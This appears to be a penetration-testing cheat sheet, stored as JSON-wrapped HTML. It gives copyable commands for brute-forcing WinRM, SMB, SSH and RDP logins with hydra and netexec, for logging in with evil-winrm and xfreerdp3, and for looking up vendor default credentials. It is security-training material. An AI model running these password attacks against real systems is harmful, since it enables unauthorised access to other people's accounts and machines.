{"html":"<h2 id=\"winrm-exploitation\">WinRM Exploitation</h2>\n<h3 id=\"bruteforce-attack-winrm\">Bruteforce Attack WinRM</h3>\n<div class=\"walkthrough-command\"><button type=\"button\" class=\"copy-command\">Copy code</button><pre><code class=\"language-bash\">netexec winrm &lt;TARGET IP&gt; -u &lt;username/user wordlist&gt; -p &lt;password/password wordlist&gt;\n</code></pre></div>\n<h3 id=\"login-winrm\">Login WinRM</h3>\n<div class=\"walkthrough-command\"><button type=\"button\" class=\"copy-command\">Copy code</button><pre><code class=\"language-bash\">evil-winrm -i &lt;TARGET IP&gt; -u &lt;username&gt;\n</code></pre></div>\n<h2 id=\"smb-exploitation\">SMB Exploitation</h2>\n<h2 id=\"bruteforce-attack-smb\">Bruteforce Attack SMB</h2>\n<div class=\"walkthrough-command\"><button type=\"button\" class=\"copy-command\">Copy code</button><pre><code class=\"language-bash\">hydra -L &lt;user/user wordlist&gt; -P &lt;password/password wordlist&gt; smb://TARGET IP\n</code></pre></div>\n<h2 id=\"ssh-exploitation\">SSH Exploitation</h2>\n<h3 id=\"bruteforce-attack-ssh\">Bruteforce Attack SSH</h3>\n<div class=\"walkthrough-command\"><button type=\"button\" class=\"copy-command\">Copy code</button><pre><code class=\"language-bash\">hydra -L &lt;username/user wordlist&gt; -P &lt;password/password wordlist&gt; ssh://&lt;TARGET IP&gt;\n</code></pre></div>\n<h2 id=\"rdp-exploitation\">RDP Exploitation</h2>\n<h3 id=\"bruteforce-attack-rdp\">Bruteforce Attack RDP</h3>\n<div class=\"walkthrough-command\"><button type=\"button\" class=\"copy-command\">Copy code</button><pre><code class=\"language-bash\">hydra -L &lt;username/user wordlist&gt; -P &lt;password/password wordlist&gt; rdp://&lt;TARGET IP&gt;\n</code></pre></div>\n<h3 id=\"logging-into-rdp\">Logging into RDP</h3>\n<div class=\"walkthrough-command\"><button type=\"button\" class=\"copy-command\">Copy code</button><pre><code class=\"language-bash\">xfreerdp3 /v:&lt;TARGET IP&gt; /u:&lt;username&gt; /p:\"&lt;password&gt;\"\n</code></pre></div>\n<h2 id=\"default-credentials\">Default Credentials</h2>\n<h3 id=\"install\">Install</h3>\n<div class=\"walkthrough-command\"><button type=\"button\" class=\"copy-command\">Copy code</button><pre><code class=\"language-bash\">python -m venv venv\nsource venv/bin/activate\npip3 install defaultcreds-cheat-sheet\n</code></pre></div>\n<h3 id=\"search-credentials\">Search Credentials</h3>\n<div class=\"walkthrough-command\"><button type=\"button\" class=\"copy-command\">Copy code</button><pre><code class=\"language-bash\">creds search &lt;service name&gt;\n</code></pre></div>\n<p><strong>Example</strong> : <code>creds search mysql</code></p>\n","toc":[{"id":"winrm-exploitation","title":"WinRM Exploitation","level":2},{"id":"bruteforce-attack-winrm","title":"Bruteforce Attack WinRM","level":3},{"id":"login-winrm","title":"Login WinRM","level":3},{"id":"smb-exploitation","title":"SMB Exploitation","level":2},{"id":"bruteforce-attack-smb","title":"Bruteforce Attack SMB","level":2},{"id":"ssh-exploitation","title":"SSH Exploitation","level":2},{"id":"bruteforce-attack-ssh","title":"Bruteforce Attack SSH","level":3},{"id":"rdp-exploitation","title":"RDP Exploitation","level":2},{"id":"bruteforce-attack-rdp","title":"Bruteforce Attack RDP","level":3},{"id":"logging-into-rdp","title":"Logging into RDP","level":3},{"id":"default-credentials","title":"Default Credentials","level":2},{"id":"install","title":"Install","level":3},{"id":"search-credentials","title":"Search Credentials","level":3}]}